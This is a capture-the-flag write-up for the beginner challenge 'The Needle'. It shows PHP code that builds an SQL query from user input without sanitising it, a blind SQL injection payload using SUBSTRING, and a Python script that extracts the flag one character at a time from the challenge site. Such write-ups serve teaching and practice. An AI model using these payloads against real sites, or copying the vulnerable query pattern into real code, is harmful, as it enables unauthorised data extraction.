
# [WWCTF] - Writeup

## Challenge: The Needle
**Category:** Beginner  

---

### Description
*author: dxler

You are presented with a simple search tool, an interface to a vast and hidden archive of information. Your mission is to find a single, specific secret hidden within. The tool is your only guide, but it is notoriously cryptic. You'll need to use clever queries and careful observation to uncover the prize.
*

---

### Analysis
>This challenge gave us the code on the backend.

```php
if(isset($_GET['id'])) {
            @$searchQ = $_GET['id'];
            @$sql = "SELECT information FROM info WHERE id = '$searchQ'";
            @$result = mysqli_query($conn, $sql);
            @$row_count = mysqli_num_rows($result);
            
            if ($row_count > 0) {
                echo "Yes, We found it !!";
            } else {
                echo "Nothing here";
            }
            $conn->close();
        }
```

>This code snippet shows that when we give an input (id), it will get placed into an SQL query without any checks. This will allow for SQL injection. The result of SQL query will be passed to row_count. If row count is greater than 0, it will return 'Yes, We found it!'. Otherwise, it will return 'Nothing here'. This means that regardless of our input, there is no way to submit an SQL query that will output the flag. However, since the code will give one of 2 results, this means we can test values to see if they result in true. This means a blind SQL injection.

---

### Approach
>The challenge website gives this interface for the SQL injection. We can test it works by giving it the value 1, which, in the SQL query, would be 'SELECT information FROM info WHERE id = 1'. This returns true.
<img width="630" height="302" alt="Screenshot 2025-07-28 at 2 34 15 PM" src="https://github.com/user-attachments/assets/693fb90d-92f5-486b-8556-e351fb492625" />

>Now that we know this works, we can use blind SQL injection to try values and see if they are correct. Since we know the first letter of the flag is 'w', we can test this to make sure it works. We would need the SQL query to be something like:
```sql
'SELECT information FROM info WHERE id = '0' OR SUBSTRING((SELECT information FROM info WHERE id=1),1,1) = 'w'
```
>In order to get this, we would need to input:
```sql
0' OR SUBSTRING((SELECT information FROM info WHERE id=1),1,1) = 'w
```
>This will check if inputing 0 returns true, which we know it doesn't, or if the next section of the query returns true, which it should if we have the letter correct.
<img width="625" height="293" alt="Screenshot 2025-07-28 at 2 48 00 PM" src="https://github.com/user-attachments/assets/1a81e65c-7e4a-45aa-be4f-45238003acaa" />

>It works! This confirms that it is reading from the flag and that the first letter is 'w'.


---

### Exploitation / Solution
>We could manually try each letter in the flag to get the result. However, this would be annoying and tedious, so I wrote a python script for this.
```python
import requests
import string


url = "https://the-needle.chall.wwctf.com/"  # Target URL
param_name = "id"  # Vulnerable parameter name

# Characters to try for each position in the flag
charset = string.ascii_letters + string.digits + "_{}-!"

flag = ""
position = 1

print("Starting blind SQL injection to extract the flag...")

while True:
    found_char = None
    for c in charset:
        # Craft payload for current position and character guess
        payload = f"0' OR SUBSTRING((SELECT information FROM info WHERE id=1),{position},1) = '{c}"

        # Send the HTTP GET request with the injection in the parameter
        params = {param_name: payload}
        response = requests.get(url, params=params)

        # Check for the condition that indicates a TRUE result
        # In this case, the string "Yes, We found it !! "s

        if "Yes, We found it !! " in response.text:
            print(f"Position {position}: Found character '{c}'")
            flag += c
            position += 1
            found_char = c
            break

    if not found_char:
        print("No matching character found at position", position)
        print("Final extracted flag:", flag)
        break
```
>This script automates the process by trying each number, letter, and special character for each position in the string, until it gets the true message, then moves to the next position. Once it gets to the end, it will not find any character that works, and return the final string.
<img width="494" height="483" alt="Screenshot 2025-07-28 at 2 56 18 PM" src="https://github.com/user-attachments/assets/e8389ef2-a269-466c-913d-e6fbdd0d1555" />

>After running this script, we get the flag: wwf{s1mpl3_bl!nd_sql}
